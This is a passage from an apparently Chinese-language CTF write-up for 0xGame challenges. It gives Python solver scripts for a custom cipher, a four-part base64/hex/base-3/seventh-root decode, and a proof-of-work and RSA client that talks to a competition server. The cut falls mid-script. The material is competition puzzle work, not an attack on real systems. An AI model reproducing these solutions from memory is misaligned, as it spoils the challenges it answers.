class=\"line\">119</span><br><span class=\"line\">120</span><br><span class=\"line\">121</span><br><span class=\"line\">122</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> string <span class=\"keyword\">import</span> digits, ascii_letters, punctuation, ascii_lowercase</span><br><span class=\"line\"><span class=\"keyword\">from</span> itertools <span class=\"keyword\">import</span> product</span><br><span class=\"line\"></span><br><span class=\"line\">key = <span class=\"string\">&quot;QAQ(@.@)&quot;</span></span><br><span class=\"line\">alphabet = digits + ascii_letters + punctuation</span><br><span class=\"line\">ciphertext = <span class=\"string\">&quot;0l0CSoYM&lt;c;amo_P_&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">f&quot;密文: <span class=\"subst\">&#123;ciphertext&#125;</span>&quot;</span>)</span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">f&quot;Key: <span class=\"subst\">&#123;key&#125;</span>&quot;</span>)</span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">f&quot;Alphabet长度: <span class=\"subst\">&#123;<span class=\"built_in\">len</span>(alphabet)&#125;</span>&quot;</span>)</span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">&quot;=&quot;</span>*<span class=\"number\">70</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 验证加密函数</span></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">vigenere_encrypt</span>(<span class=\"params\">plaintext, key</span>):</span><br><span class=\"line\">    ciphertext = <span class=\"string\">&quot;&quot;</span></span><br><span class=\"line\">    key_index = <span class=\"number\">0</span></span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> plaintext:</span><br><span class=\"line\">        bias = alphabet.index(key[key_index])</span><br><span class=\"line\">        char_index = alphabet.index(i)</span><br><span class=\"line\">        new_index = ((char_index + bias) * char_index) % <span class=\"built_in\">len</span>(alphabet)</span><br><span class=\"line\">        ciphertext += alphabet[new_index]</span><br><span class=\"line\">        key_index = (key_index + <span class=\"number\">1</span>) % <span class=\"built_in\">len</span>(key)</span><br><span class=\"line\">    <span class=\"keyword\">return</span> ciphertext</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 找出每个位置的所有可能解</span></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">find_all_solutions_per_position</span>(<span class=\"params\">ciphertext, key</span>):</span><br><span class=\"line\">    all_solutions = []</span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"keyword\">for</span> pos, cipher_char <span class=\"keyword\">in</span> <span class=\"built_in\">enumerate</span>(ciphertext):</span><br><span class=\"line\">        key_index = pos % <span class=\"built_in\">len</span>(key)</span><br><span class=\"line\">        bias = alphabet.index(key[key_index])</span><br><span class=\"line\">        cipher_index = alphabet.index(cipher_char)</span><br><span class=\"line\">        </span><br><span class=\"line\">        solutions = []</span><br><span class=\"line\">        <span class=\"keyword\">for</span> char_index <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"built_in\">len</span>(alphabet)):</span><br><span class=\"line\">            <span class=\"keyword\">if</span> ((char_index + bias) * char_index) % <span class=\"built_in\">len</span>(alphabet) == cipher_index:</span><br><span class=\"line\">                solutions.append(alphabet[char_index])</span><br><span class=\"line\">        </span><br><span class=\"line\">        all_solutions.append(solutions)</span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"keyword\">return</span> all_solutions</span><br><span class=\"line\"></span><br><span class=\"line\">all_solutions = find_all_solutions_per_position(ciphertext, key)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 显示每个位置的可能解</span></span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">&quot;\\n每个位置的所有可能解:&quot;</span>)</span><br><span class=\"line\"><span class=\"keyword\">for</span> i, (cipher_char, solutions) <span class=\"keyword\">in</span> <span class=\"built_in\">enumerate</span>(<span class=\"built_in\">zip</span>(ciphertext, all_solutions)):</span><br><span class=\"line\">    key_char = key[i % <span class=\"built_in\">len</span>(key)]</span><br><span class=\"line\">    <span class=\"built_in\">print</span>(<span class=\"string\">f&quot;位置<span class=\"subst\">&#123;i:2d&#125;</span> | 密文:&#x27;<span class=\"subst\">&#123;cipher_char&#125;</span>&#x27; key:&#x27;<span class=\"subst\">&#123;key_char&#125;</span>&#x27; | 解:<span class=\"subst\">&#123;solutions&#125;</span> (共<span class=\"subst\">&#123;<span class=\"built_in\">len</span>(solutions)&#125;</span>个)&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">&quot;\\n&quot;</span> + <span class=\"string\">&quot;=&quot;</span>*<span class=\"number\">70</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 尝试搜索所有符合条件的flag</span></span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">&quot;搜索符合 0xGame&#123;小写字母&#125; 格式的所有可能flag:\\n&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">target_prefix = <span class=\"string\">&quot;0xGame&#123;&quot;</span></span><br><span class=\"line\">target_suffix = <span class=\"string\">&quot;&#125;&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 检查前缀和后缀是否可行</span></span><br><span class=\"line\">prefix_valid = <span class=\"built_in\">all</span>(target_prefix[i] <span class=\"keyword\">in</span> all_solutions[i] <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"built_in\">len</span>(target_prefix)))</span><br><span class=\"line\">suffix_valid = target_suffix <span class=\"keyword\">in</span> all_solutions[-<span class=\"number\">1</span>]</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> <span class=\"keyword\">not</span> prefix_valid:</span><br><span class=\"line\">    <span class=\"built_in\">print</span>(<span class=\"string\">&quot;❌ 无法构造 &#x27;0xGame&#123;&#x27; 前缀&quot;</span>)</span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"built_in\">len</span>(target_prefix)):</span><br><span class=\"line\">        <span class=\"keyword\">if</span> target_prefix[i] <span class=\"keyword\">not</span> <span class=\"keyword\">in</span> all_solutions[i]:</span><br><span class=\"line\">            <span class=\"built_in\">print</span>(<span class=\"string\">f&quot;   位置<span class=\"subst\">&#123;i&#125;</span>: 需要&#x27;<span class=\"subst\">&#123;target_prefix[i]&#125;</span>&#x27;, 但只有 <span class=\"subst\">&#123;all_solutions[i]&#125;</span>&quot;</span>)</span><br><span class=\"line\"><span class=\"keyword\">elif</span> <span class=\"keyword\">not</span> suffix_valid:</span><br><span class=\"line\">    <span class=\"built_in\">print</span>(<span class=\"string\">f&quot;❌ 无法构造 &#x27;&#125;&#125;&#x27; 后缀，位置<span class=\"subst\">&#123;<span class=\"built_in\">len</span>(ciphertext)-<span class=\"number\">1</span>&#125;</span>只有: <span class=\"subst\">&#123;all_solutions[-<span class=\"number\">1</span>]&#125;</span>&quot;</span>)</span><br><span class=\"line\"><span class=\"keyword\">else</span>:</span><br><span class=\"line\">    <span class=\"built_in\">print</span>(<span class=\"string\">&quot;✓ 前缀和后缀都可行\\n&quot;</span>)</span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"comment\"># 中间部分的索引</span></span><br><span class=\"line\">    middle_start = <span class=\"built_in\">len</span>(target_prefix)</span><br><span class=\"line\">    middle_end = <span class=\"built_in\">len</span>(ciphertext) - <span class=\"number\">1</span></span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"comment\"># 获取中间每个位置的小写字母选项</span></span><br><span class=\"line\">    middle_options = []</span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(middle_start, middle_end):</span><br><span class=\"line\">        lowercase_opts = [c <span class=\"keyword\">for</span> c <span class=\"keyword\">in</span> all_solutions[i] <span class=\"keyword\">if</span> c <span class=\"keyword\">in</span> ascii_lowercase]</span><br><span class=\"line\">        middle_options.append(lowercase_opts)</span><br><span class=\"line\">        <span class=\"built_in\">print</span>(<span class=\"string\">f&quot;位置<span class=\"subst\">&#123;i&#125;</span> 的小写字母选项: <span class=\"subst\">&#123;lowercase_opts&#125;</span>&quot;</span>)</span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"comment\"># 检查是否所有中间位置都有小写字母选项</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> <span class=\"built_in\">all</span>(<span class=\"built_in\">len</span>(opts) &gt; <span class=\"number\">0</span> <span class=\"keyword\">for</span> opts <span class=\"keyword\">in</span> middle_options):</span><br><span class=\"line\">        <span class=\"built_in\">print</span>(<span class=\"string\">f&quot;\\n所有中间位置都有小写字母选项&quot;</span>)</span><br><span class=\"line\">        <span class=\"built_in\">print</span>(<span class=\"string\">f&quot;总共有 <span class=\"subst\">&#123;<span class=\"built_in\">sum</span>(<span class=\"built_in\">len</span>(opts) <span class=\"keyword\">for</span> opts <span class=\"keyword\">in</span> middle_options)&#125;</span> 个可能的组合&quot;</span>)</span><br><span class=\"line\">        </span><br><span class=\"line\">        <span class=\"comment\"># 如果组合数不太多，枚举所有可能</span></span><br><span class=\"line\">        total_combinations = <span class=\"number\">1</span></span><br><span class=\"line\">        <span class=\"keyword\">for</span> opts <span class=\"keyword\">in</span> middle_options:</span><br><span class=\"line\">            total_combinations *= <span class=\"built_in\">len</span>(opts)</span><br><span class=\"line\">        </span><br><span class=\"line\">        <span class=\"built_in\">print</span>(<span class=\"string\">f&quot;可能的flag数量: <span class=\"subst\">&#123;total_combinations&#125;</span>&quot;</span>)</span><br><span class=\"line\">        </span><br><span class=\"line\">        <span class=\"keyword\">if</span> total_combinations &lt;= <span class=\"number\">1000</span>:</span><br><span class=\"line\">            <span class=\"built_in\">print</span>(<span class=\"string\">&quot;\\n枚举所有可能的flag:\\n&quot;</span>)</span><br><span class=\"line\">            valid_flags = []</span><br><span class=\"line\">            </span><br><span class=\"line\">            <span class=\"keyword\">for</span> combo <span class=\"keyword\">in</span> product(*middle_options):</span><br><span class=\"line\">                middle = <span class=\"string\">&quot;&quot;</span>.join(combo)</span><br><span class=\"line\">                flag = target_prefix + middle + target_suffix</span><br><span class=\"line\">                </span><br><span class=\"line\">                <span class=\"comment\"># 验证</span></span><br><span class=\"line\">                encrypted = vigenere_encrypt(flag, key)</span><br><span class=\"line\">                <span class=\"keyword\">if</span> encrypted == ciphertext:</span><br><span class=\"line\">                    valid_flags.append(flag)</span><br><span class=\"line\">                    <span class=\"built_in\">print</span>(<span class=\"string\">f&quot;✓ 找到有效flag: <span class=\"subst\">&#123;flag&#125;</span>&quot;</span>)</span><br><span class=\"line\">            </span><br><span class=\"line\">            <span class=\"keyword\">if</span> <span class=\"keyword\">not</span> valid_flags:</span><br><span class=\"line\">                <span class=\"built_in\">print</span>(<span class=\"string\">&quot;❌ 没有找到完全匹配的flag&quot;</span>)</span><br><span class=\"line\">            <span class=\"keyword\">else</span>:</span><br><span class=\"line\">                <span class=\"built_in\">print</span>(<span class=\"string\">f&quot;\\n找到 <span class=\"subst\">&#123;<span class=\"built_in\">len</span>(valid_flags)&#125;</span> 个有效flag&quot;</span>)</span><br><span class=\"line\">        <span class=\"keyword\">else</span>:</span><br><span class=\"line\">            <span class=\"built_in\">print</span>(<span class=\"string\">f&quot;\\n组合数太多(<span class=\"subst\">&#123;total_combinations&#125;</span>)，显示第一个可能的flag:&quot;</span>)</span><br><span class=\"line\">            middle = <span class=\"string\">&quot;&quot;</span>.join(opts[<span class=\"number\">0</span>] <span class=\"keyword\">for</span> opts <span class=\"keyword\">in</span> middle_options)</span><br><span class=\"line\">            flag = target_prefix + middle + target_suffix</span><br><span class=\"line\">            encrypted = vigenere_encrypt(flag, key)</span><br><span class=\"line\">            <span class=\"built_in\">print</span>(<span class=\"string\">f&quot;Flag: <span class=\"subst\">&#123;flag&#125;</span>&quot;</span>)</span><br><span class=\"line\">            <span class=\"built_in\">print</span>(<span class=\"string\">f&quot;验证: <span class=\"subst\">&#123;encrypted == ciphertext&#125;</span>&quot;</span>)</span><br><span class=\"line\">    <span class=\"keyword\">else</span>:</span><br><span class=\"line\">        <span class=\"built_in\">print</span>(<span class=\"string\">&quot;\\n❌ 某些中间位置没有小写字母选项&quot;</span>)</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"笙莲\"><a href=\"#笙莲\" class=\"headerlink\" title=\"笙莲\"></a>笙莲</h2><p>题目将一个 100 字节的 flag（原始 flag 内容 + 随机填充）分成了四个 25 字节的部分，并对每个部分使用了不同的加密方法。我们的任务是分别逆向这些加密过程，然后将四部分拼接回来，最后得到原始的 flag。</p>\n<p>给定的密文：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">c0_b64 = <span class=\"string\">b&#x27;MHhHYW1le7u2063AtLW9MHhHYW1lMjAyNQ==&#x27;</span></span><br><span class=\"line\">c1_hex = <span class=\"string\">&#x27;a3accfd6d4dac4e3d2d1beadd1a7bbe143727970746fb5c4bb&#x27;</span></span><br><span class=\"line\">c2_awaqaq = <span class=\"string\">&#x27;wqwwwqqaawwwaaqawqwawwwwaaawwwawaqqwwwqaqwwqwaaqwaqqaaawqqqaqaqwaaawwwqaqaaaaqawaqqqwwqqwaqwqwwwawawqqwwqqawqwaqwwawwqwaqqaqwaw&#x27;</span></span><br><span class=\"line\">c3_int = <span class=\"number\">5787980659359196741038715872684190805073807486263453249083702093905274294594502252203577660251756609738877887210677202141957646934092054500618364441642896304387589669635034683021946777034215355675802286923927161922717560413551789421376288823912349463080999424773600185557948875343480056576969695671340947861706467351885610345887785319870159654836532664189086047061137903149197973327299859185905186913896041309284477616128</span></span><br></pre></td></tr></table></figure>\n\n<p>Part1. Base64解密</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> base64</span><br><span class=\"line\"></span><br><span class=\"line\">flag0 = base64.b64decode(c0_b64)</span><br></pre></td></tr></table></figure>\n\n<p>Part2.十六进制转字节</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">flag1 = <span class=\"built_in\">bytes</span>.fromhex(c1_hex)</span><br></pre></td></tr></table></figure>\n\n<p>Part3. 替换加密, ‘a’ 代表 0，’w’ 代表 1，’q’ 代表 2</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">reverse_awaqaq</span>(<span class=\"params\">s: <span class=\"built_in\">str</span></span>) -&gt; <span class=\"built_in\">bytes</span>:</span><br><span class=\"line\">    mapper = &#123;<span class=\"string\">&#x27;a&#x27;</span>: <span class=\"number\">0</span>, <span class=\"string\">&#x27;w&#x27;</span>: <span class=\"number\">1</span>, <span class=\"string\">&#x27;q&#x27;</span>: <span class=\"number\">2</span>&#125;</span><br><span class=\"line\">    num = <span class=\"number\">0</span></span><br><span class=\"line\">    power = <span class=\"number\">1</span></span><br><span class=\"line\">    <span class=\"keyword\">for</span> char <span class=\"keyword\">in</span> s:</span><br><span class=\"line\">        num += mapper[char] * power</span><br><span class=\"line\">        power *= <span class=\"number\">3</span></span><br><span class=\"line\">    <span class=\"comment\"># 原始脚本中 int.from_bytes 默认使用大端序 (big-endian)</span></span><br><span class=\"line\">    <span class=\"comment\"># 长度为 25 字节</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> num.to_bytes(<span class=\"number\">25</span>, <span class=\"string\">&#x27;big&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">flag2 = reverse_awaqaq(c2_awaqaq)</span><br></pre></td></tr></table></figure>\n\n<p>Part4. 7次方并用小端序表示的数，开7次方根</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">integer_nth_root</span>(<span class=\"params\">n, r</span>):</span><br><span class=\"line\">    <span class=\"string\">&quot;&quot;&quot;计算 n 的 r 次整数根&quot;&quot;&quot;</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> n &lt; <span class=\"number\">0</span>:</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"literal\">None</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> n == <span class=\"number\">0</span>:</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"number\">0</span></span><br><span class=\"line\">    low, high = <span class=\"number\">1</span>, n</span><br><span class=\"line\">    root = <span class=\"literal\">None</span></span><br><span class=\"line\">    <span class=\"keyword\">while</span> low &lt;= high:</span><br><span class=\"line\">        mid = (low + high) // <span class=\"number\">2</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span> mid == <span class=\"number\">0</span>:  <span class=\"comment\"># 避免 mid 为 0</span></span><br><span class=\"line\">            low = <span class=\"number\">1</span></span><br><span class=\"line\">            <span class=\"keyword\">continue</span></span><br><span class=\"line\">        <span class=\"keyword\">try</span>:</span><br><span class=\"line\">            val = mid**r</span><br><span class=\"line\">        <span class=\"keyword\">except</span> OverflowError:</span><br><span class=\"line\">            val = <span class=\"built_in\">float</span>(<span class=\"string\">&#x27;inf&#x27;</span>)</span><br><span class=\"line\">        </span><br><span class=\"line\">        <span class=\"keyword\">if</span> val == n:</span><br><span class=\"line\">            <span class=\"keyword\">return</span> mid</span><br><span class=\"line\">        <span class=\"keyword\">elif</span> val &lt; n:</span><br><span class=\"line\">            low = mid + <span class=\"number\">1</span></span><br><span class=\"line\">            root = mid</span><br><span class=\"line\">        <span class=\"keyword\">else</span>:</span><br><span class=\"line\">            high = mid - <span class=\"number\">1</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> root</span><br><span class=\"line\"></span><br><span class=\"line\">root = integer_nth_root(c3_int, <span class=\"number\">7</span>)</span><br><span class=\"line\"><span class=\"comment\"># 题目指明了使用小端序 (little-endian)</span></span><br><span class=\"line\">flag3 = root.to_bytes(<span class=\"number\">25</span>, <span class=\"string\">&#x27;little&#x27;</span>)</span><br></pre></td></tr></table></figure>\n\n<p>最后拼接4个部分的flag，然后使用<code>gb2312</code>编码解码得到flag。</p>\n<h2 id=\"2FA\"><a href=\"#2FA\" class=\"headerlink\" title=\"2FA\"></a>2FA</h2><p>这道题的收获就是安装了一个好用的身份验证APP，<code>microsoft authenticator</code>，扫码验证登录了就行了。</p>\n<h2 id=\"芸翎\"><a href=\"#芸翎\" class=\"headerlink\" title=\"芸翎\"></a>芸翎</h2><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br><span class=\"line\">117</span><br><span class=\"line\">118</span><br><span class=\"line\">119</span><br><span class=\"line\">120</span><br><span class=\"line\">121</span><br><span class=\"line\">122</span><br><span class=\"line\">123</span><br><span class=\"line\">124</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> socket</span><br><span class=\"line\"><span class=\"keyword\">import</span> re</span><br><span class=\"line\"><span class=\"keyword\">import</span> hashlib</span><br><span class=\"line\"><span class=\"keyword\">import</span> string</span><br><span class=\"line\"><span class=\"keyword\">from</span> itertools <span class=\"keyword\">import</span> product</span><br><span class=\"line\"><span class=\"keyword\">from</span> Crypto.Util.number <span class=\"keyword\">import</span> long_to_bytes</span><br><span class=\"line\"><span class=\"keyword\">import</span> time</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># --- 配置 ---</span></span><br><span class=\"line\">HOST = <span class=\"string\">&#x27;nc1.ctfplus.cn&#x27;</span></span><br><span class=\"line\">PORT = <span class=\"number\">12494</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># --- PoW 解决函数 ---</span></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">solve_pow</span>(<span class=\"params\">suffix: <span class=\"built_in\">str</span>, target_hash: <span class=\"built_in\">str</span></span>) -&gt; <span class=\"built_in\">str</span>:</span><br><span class=\"line\">    <span class=\"string\">&quot;&quot;&quot;</span></span><br><span class=\"line\"><span class=\"string\">    通过暴力破解来解决 SHA-256 工作量证明挑战。</span></span><br><span class=\"line\"><span class=\"string\">    &quot;&quot;&quot;</span></span><br><span class=\"line\">    <span class=\"built_in\">print</span>(<span class=\"string\">f&quot;[*] 目标: sha256(XXXX + <span class=\"subst\">&#123;suffix&#125;</span>) == <span class=\"subst\">&#123;target_hash&#125;</span>&quot;</span>)</span><br><span class=\"line\">    <span class=\"built_in\">print</span>(<span class=\"string\">&quot;[*] 开始暴力破解 PoW...&quot;</span>)</span><br><span class=\"line\">    start_time = time.time()</span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"comment\"># 字符集：大小写字母 + 数字</span></span><br><span class=\"line\">    charset = string.ascii_letters + string.digits</span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"comment\"># 遍历所有长度为 4 的组合</span></span><br><span class=\"line\">    <span class=\"keyword\">for</span> i, prefix_tuple <span class=\"keyword\">in</span> <span class=\"built_in\">enumerate</span>(product(charset, repeat=<span class=\"number\">4</span>)):</span><br><span class=\"line\">        prefix = <span class=\"string\">&quot;&quot;</span>.join(prefix_tuple)</span><br><span class=\"line\">        test_string = prefix + suffix</span><br><span class=\"line\">        calculated_hash = hashlib.sha256(test_string.encode()).hexdigest()</span><br><span class=\"line\">        </span><br><span class=\"line\">        <span class=\"keyword\">if</span> calculated_hash == target_hash:</span><br><span class=\"line\">            end_time = time.time()</span><br><span class=\"line\">            duration = end_time - start_time</span><br><span class=\"line\">            <span class=\"built_in\">print</span>(<span class=\"string\">f&quot;[+] PoW 解决！ 前缀: <span class=\"subst\">&#123;prefix&#125;</span> (耗时: <span class=\"subst\">&#123;duration:<span class=\"number\">.2</span>f&#125;</span>s)&quot;</span>)</span><br><span class=\"line\">            <span class=\"keyword\">return</span> prefix</span><br><span class=\"line\">            </span><br><span class=\"line\">    <span class=\"built_in\">print</span>(<span class=\"string\">&quot;[-] PoW 破解失败！&quot;</span>)</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"literal\">None</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># --- 主逻辑 ---</span></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">main</span>():</span><br><span class=\"line\">    <span class=\"keyword\">try</span>:</span><br><span class=\"line\">        <span class=\"comment\"># 1. 建立连接</span></span><br><span class=\"line\">        <span class=\"keyword\">with</span> socket.socket(socket.AF_INET, socket.SOCK_STREAM) <span class=\"keyword\">as</span> s:</span><br><span class=\"line\">            s.connect((HOST, PORT))</span><br><span class=\"line\">            <span class=\"built_in\">print</span>(<span class=\"string\">f&quot;[+] 已连接到 <span class=\"subst\">&#123;HOST&#125;</span>:<span class=\"subst\">&#123;PORT&#125;</span>&quot;</span>)</span><br><span class=\"line\">            </span><br><span class=\"line\">            <span class=\"comment\"># 2. 接收并解决 PoW</span></span><br><span class=\"line\">            initial_data = s.recv(<span class=\"number\">1024</span>).decode()</span><br><span class=\"line\">            <span class=\"built_in\">print</span>(initial_data)</span><br><span class=\"line\">            </span><br><span class=\"line\">            <span class=\"comment\"># 使用正则表达式解析 PoW 挑战</span></span><br><span class=\"line\">            pow_match = re.search(<span class=\"string\">r&#x27;sha256\\(XXXX\\+(.*?)\\) == ([\\da-f]&#123;64&#125;)&#x27;</span>, initial_data)</span><br><span class=\"line\">            <span class=\"keyword\">if</span> <span class=\"keyword\">not</span> pow_match:</span><br><span class=\"line\">                <span class=\"built_in\">print</span>(<span class=\"string\">&quot;[-] 无法解析 PoW 挑战。&quot;</span>)</span><br><span class=\"line\">                <span class=\"keyword\">return</span></span><br><span class=\"line\">            </span><br><span class=\"line\">            suffix, target = pow_match.groups()</span><br><span class=\"line\">            solution = solve_pow(suffix, target)</span><br><span class=\"line\">            </span><br><span class=\"line\">            <span class=\"keyword\">if</span> <span class=\"keyword\">not</span> solution:</span><br><span class=\"line\">                <span class=\"keyword\">return</span></span><br><span class=\"line\"></span><br><span class=\"line\">            <span class=\"comment\"># 发送解决方案</span></span><br><span class=\"line\">            s.sendall((solution + <span class=\"string\">&#x27;\\n&#x27;</span>).encode())</span><br><span class=\"line\">            </span><br><span class=\"line\">            <span class=\"comment\"># 3. 接收 RSA 参数并解密</span></span><br><span class=\"line\">            <span class=\"comment\"># 增大缓冲区以确保接收所有数据</span></span><br><span class=\"line\">            response_data = s.recv(<span class=\"number\">4096</span>).decode()</span><br><span class=\"line\">            <span class=\"built_in\">print</span>(response_data)</span><br><span class=\"line\">            </span><br><span class=\"line\">            <span class=\"comment\"># 使用正则表达式解析 n, e, c</span></span><br><span class=\"line\">            n_match = re.search(<span class=\"string\">r&#x27;n = (\\d+)&#x27;</span>, response_data)</span><br><span class=\"line\">            e_match = re.search(<span class=\"string\">r&#x27;e = 